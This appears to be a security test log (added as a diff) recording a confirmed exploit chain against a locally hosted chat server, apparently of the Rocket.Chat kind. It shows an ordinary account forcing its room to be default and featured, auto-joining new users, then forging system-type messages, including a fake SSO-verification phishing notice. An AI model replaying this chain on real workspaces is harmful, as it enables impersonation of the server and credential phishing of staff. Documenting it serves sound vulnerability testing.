@@ -1,0 +1,19 @@
+========================================================================
+CHAIN-006: a self-made default room that speaks with the server's voice
+target : http://127.0.0.1:39649
+author : Blue Spider
+========================================================================
+[INFO] chaining VULN-058 (room.extraData is spread into the room: default + featured) -> the default-channel feature (new accounts are joined automatically) -> VULN-012 (rooms.mediaConfirm lets the caller choose the message type)
+[SETUP] attacker newstarter_9a8b55af registered through the public form (role: user)
+[STEP] 1/3 VULN-058: teams.create it-announcements-9a8b55af with room.extraData {default: true, featured: true}
+[PROOF]     HTTP 200: the administrator's own view of the room reports {"name": "it-announcements-9a8b55af", "default": true, "featured": true, "t": "c", "description": "Official IT announcements"}
+[INFO]     the control, the ordinary channel route: channels.create with the same extraData -> HTTP 400 must NOT have additional properties
+[STEP] 2/3 feature: register a new employee through the public form and see where the workspace puts them
+[PROOF]     the new account was joined to ['teda7-026fccd1', 'onboarding-026fccd1', 'tb54d-2465c862', 'onboarding-2465c862', 'it-announcements-9a8b55af', 'general'] without any invitation: the attacker's room is there=True; rooms the directory now features: ['it-announcements-9a8b55af', 'onboarding-026fccd1', 'onboarding-2465c862']
+[STEP] 3/3 VULN-012: upload a file into the room and confirm it with a system message type and attacker-chosen text
+[PROOF]     stored message types ['r', 'au', 'subscription-role-added'] with attacker text; the product's own send route refuses the identical message: chat.sendMessage -> HTTP 400 Cannot send system messages using 'chat.sendMessage'
+[PROOF]     the auto-joined member reads them back as system notices: [{"t": "subscription-role-added", "msg": "joiner_9a8b55af was set as owner by IT (9a8b55af)", "u": "newstarter_9a8b55af"}, {"t": "au", "msg": "IT added everyone to this channel: confirm your account at https://sso-verify.example/9a8b55af", "u": "newstarter_9a8b55af"}, {"t": "r", "msg": "Room renamed to it-announcements-verified (9a8b55af)", "u": "newstarter_9a8b55af"}]
+[INFO] cleanup: deleting the team, its room and the two accounts this run created
+[INFO]     room gone: True
+[OK] CHAIN-006 CONFIRMED
+==> CHAIN-006 CONFIRMED 2026-11-24 - an ordinary account flagged its own room default and featured through teams.create, the workspace then joined a newly registered account to it with no invitation, and in that room the same account stored three messages with system types and attacker text which the new member read back as the server's own notices
